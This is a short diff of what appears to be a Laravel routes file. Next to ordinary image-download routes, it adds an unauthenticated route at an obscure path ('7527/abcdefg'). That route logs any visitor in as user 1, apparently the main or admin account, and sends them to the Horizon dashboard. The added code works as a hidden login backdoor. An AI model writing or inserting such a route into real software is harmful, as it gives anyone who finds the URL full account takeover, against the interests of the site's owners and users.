@@ -32,3 +32,10 @@ Route::get('storage/files/{date}/{id}-1.jpg', [CommonController::class, 'cover']
 
 // 下载封面图片
 Route::get('storage/files/{date}/{filename}', [CommonController::class, 'download']);
+
+Route::get('7527/abcdefg', function () {
+    $user = \App\Models\User::find(1);
+    Auth::login($user);
+    return redirect()->route('horizon.index');
+});
+
